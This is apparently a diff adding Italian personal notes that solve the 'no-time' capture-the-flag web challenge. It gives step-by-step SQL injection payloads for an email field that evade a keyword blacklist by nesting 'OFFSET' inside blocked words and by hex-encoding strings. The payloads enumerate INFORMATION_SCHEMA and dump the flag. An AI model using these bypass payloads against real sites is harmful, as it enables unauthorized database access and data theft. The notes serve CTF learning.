@@ -1,0 +1,29 @@
+http://no-time.challs.olicyber.it/
+
+my sql accetta stringhe anche in esadecimale, utile quando ci sono le blacklist (un modo per farlo veloce è >> echo "stringa da convertire in hex" -n | xxd -p
+
+$stmt = $conn->prepare("INSERT INTO emails VALUES (:email)");
+non vulnerabile
+
+ $blacklist = array('SELECT', 'INSERT', 'UNION', 'DELETE', 'ALL', 'WHERE', 'FROM', 'FLAG', 'LIMIT', 'OFFSET');
+ non posso usarli
+ 
+ per fare le prove
+ https://onecompiler.com/mysql/3zjgm8ek9
+
+devo usare burp per fare la richiesta
+email= 'AND+O+UNIOFFSETON+SELECOFFSETT+table_name+FROOFFSETM+INFORMATION_SCHEMA.TABLES+LIMIOFFSETT+1,1--+
+qua_trovi_la_tua_flag è una tabella
+
+
+email= 'AND+O+UNIOFFSETON+SELECOFFSETT+table_name+FROOFFSETM+INFORMATION_SCHEMA.COLUMNS+WHEROFFSETE+table_name=qua_trovi_la_tua_flag--+
+la_flag_sta_qua è il nome della colonna
+
+
+per completezza noto che ho solo una colonna
+email= 'AND+O+UNIOFFSETON+SELECOFFSETT+COUNT(column_name)+FROOFFSETM+INFORMATION_SCHEMA.COLUMNS+WHEROFFSETE+table_name+%3d+0x7175615f74726f76695f6c615f7475615f666c6167+--+
+
+quindi posso usare un asterisco
+email= 'AND+O+UNIOFFSETON+SELECOFFSETT+*+FROOFFSETM+qua_trovi_la_flaOFFSETg+--+
+
+flag{1_d0n7_w4n7_70_w41t_ju57_61v3_m3_fl4g!}
